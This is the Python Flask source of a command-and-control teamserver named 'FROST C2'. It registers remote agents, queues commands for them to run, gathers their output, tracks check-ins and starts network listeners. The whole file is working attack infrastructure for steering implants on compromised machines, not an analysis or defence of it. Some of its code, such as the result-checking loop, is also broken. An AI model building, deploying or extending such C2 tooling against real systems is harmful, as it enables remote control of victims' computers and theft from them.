from multiprocessing import Process
from flask_restful   import Resource, Api
from colorama        import init, Fore, Back, Style
from datetime        import datetime, timezone
from flask           import Flask, request, jsonify, render_template_string


import subprocess
import threading
import dbActions
import argparse
import requests
import logging
import sqlite3
import json
import time
import uuid
import re

app = Flask(__name__)
api = Api(app)

dbActions.CreateDB()

logger = logging.getLogger('werkzeug')
logger.disabled = True

validIp         = re.compile(r"^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")

register_queue  = list()
registered      = dbActions.GetBeacons()
listeners       = dict()
tasks           = list()

RESET = Style.RESET_ALL
RED   = Style.BRIGHT + Fore.RED
GREEN = Style.BRIGHT + Fore.GREEN


@app.route("/")
def Start():
    html =( 
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>FROST C2</title>
        </head>
        <body>
            <img src="{{ url_for('static', filename='frost.png') }}" alt="Frosty" style="width: 100%;">
        </body>
        </html>
        """)
    return render_template_string( html )

class Tasks(Resource):

    def post(self):
        """
        Get task from client
        """
        data  = json.loads( json.dumps( request.get_json() ) )

        if ( "cmd" in data ) or ( "AgentId" in data ) :
            dbActions.AddTask( data["cmd"], data["AgentId"] )

            id = dbActions.GetTaskId( data["AgentId"] )
            return {"TaskId":f"{ id }"}

    def get(self):
        """
        Get tasks for corresponding uuid
        """
        AgentId = request.args.get("id")
        tid     = dbActions.GetTaskId( AgentId ) 
        cmd     = dbActions.GetCmd( AgentId )

        return jsonify( tid=f"{ tid }",cmd=f"{ cmd }", agentId=f"{ AgentId }" )

class Register(Resource):

    def post(self):
        """
        Check in agent
        """

        data  = json.loads( json.dumps( request.get_json() ) )

        if data["checkin"] == "true":
             id = str( uuid.uuid4() )
             register_queue.append( id )
             dbActions.Register( id )

             return  {"SUCCESS":f"{ id }"}

class Beacons(Resource):

    def get( self ):
        """
        Sync beacons with client
        """
        beacons = request.args.get("sync")
        if beacons == "true":
            registered  = dbActions.GetBeacons()
            return { "Agents" : registered }

class Update(Resource):

    def post(self):
        """
        Update agent name
        """
        data   = json.loads( json.dumps( request.get_json() ) )
        uuid   = data["AgentId"]
        name   = data["Name"]

        dbActions.UpdateName( uuid, name )


class Kill(Resource):

    def post(self):
        """
        Kill a specified agent
        """
        data  = request.get_json()
        try:
            data["AgentId"]
            dbActions.Kill(data["AgentId"])
        except KeyError:
            dbActions.Kill(data["Name"])

class Results(Resource):

    def post(self):
        """
        Recieve results from beacons
        """
        data      = request.get_json()
        results   = data["result"]
        tid       = data["tid"]
        dbActions.AddResults( results, tid )

    def get(self):
        """
        Send results to client
        """
        id   = request.args.get("tid")

        tid, results, agentId, date = dbActions.GetResults( int(id) )

        current_time = datetime.now( timezone.utc )
        old_date     = datetime.strptime(date, "%Y-%m-%d %H:%M:%S").replace( tzinfo=timezone.utc )
        delta        = int( (current_time - old_date).total_seconds() )

        if results != None and ( id not in tasks ): 
            return jsonify( {"results":f"{ results }","AgentId":f"{ agentId }","TaskId":f"{ tid }"} )

        # Check if the task date is more than 15 seconds old
        elif delta >= 15 :
            dbActions.AddResults( "__NULL__", tid )
        else:
            return jsonify({"results":"NONE"})

class AddListener(Resource):

    def get(self):
        """
        Sync listeners with client
        """
        data = request.args.get("sync")
        if data == "true":
            return jsonify( listeners=list(listeners.keys()))

    def post(self):
        """
        Create a listener process
        """
        data    = request.get_json()
        host    = data["host"]
        port    = int( data["port"] )

        for ip, num in listeners.keys():
            if ( ip == host ) and ( num == port ):
                return jsonify(returned=f"Already listening on {ip}:{num}")

        # Create a new process for the listener
        if ( validIp.match( host ) ) and ( port > 0 ) and ( port < 65535 ):
            try:
                proc = Process(
                         target=app.run, 
                         kwargs={
                         "debug": False, 
                         "host": host, 
                         "port": port, 
                         "use_reloader": False
                        })
                proc.start()
            except Exception as error:
                print(f"\n{RED}Failed to start listener on {host}:{port}\n{error}\n{RESET}")
                return jsonify(returned="failed to create listener")

            listeners[ (host, port) ] = proc
            print(f"\n{GREEN}Listener on http://{host}:{port} started{RESET}\n")
            return jsonify(returned="success")
        else:
            return jsonify(returned="bad ip or port")


class DelListener(Resource):
    """
    Delete a listener process
    """

    def post(self):

        data    = request.get_json()
        host    = data["host"]
        port    = int( data["port"] )

        # Delete the listener process
        if validIp.match( host ):
            for ip, num in listeners.keys():
                    if ( ip == host ) and ( num == port ) :

                        listeners[ (host,port) ].terminate()
                        listeners[ (host,port) ].join()
                        del listeners[ (host,port) ]

                        print(f"{RED}\nListener on http://{host}:{num} removed\n{RESET}")
                        return jsonify(returned=f"success")

        return jsonify(returned="Listener not found")

class Ping(Resource):
    """
    Update last seen when beacon pings
    """

    def post(self):
        data = request.get_json()
        if data["ping"] == "true":
            dbActions.AddLastSeen( data["AgentId"] )
            return jsonify({"pong":"True"})

    def get(self):
        data = request.args.get("sync")
        if data == "true":
            timestamps = dbActions.GetLastSeen()
            return json.loads( json.dumps( timestamps ) )

def CheckResults() :
    """
    Check results if any uncompleted tasks
    """
    while True:
        if tasks:
            continue
        id = tasks.pop()
        tid, results, agentId = dbActions.GetResults( int( id ) )

        if ( results != None ) and ( id not in tasks ): 
            return jsonify( results=results, agentId=agentId, tid=tid )
        else:
            tasks.put( id )
            time.sleep(1)

api.add_resource(DelListener   ,   '/listener/remove')
api.add_resource(Update       ,   '/beacons/update')
api.add_resource(AddListener ,   '/listener/add')
api.add_resource(Register   ,   '/register')
api.add_resource(Beacons   ,   '/beacons')
api.add_resource(Results  ,   '/results')
api.add_resource(Tasks   ,   '/tasks')
api.add_resource(Kill   ,   '/kill')
api.add_resource(Ping  ,   '/ping')


if __name__ == '__main__':
    parser = argparse.ArgumentParser( description="Teamserver" )
    parser.add_argument( "-p", "--port", help="Port", default=5000 )
    parser.add_argument( "-H", "--host", help="Host", default="127.0.0.1" )

    HOST = parser.parse_args().host
    PORT = parser.parse_args().port

    app.run( debug=True, host="127.0.0.1", port=PORT,  use_reloader=False )
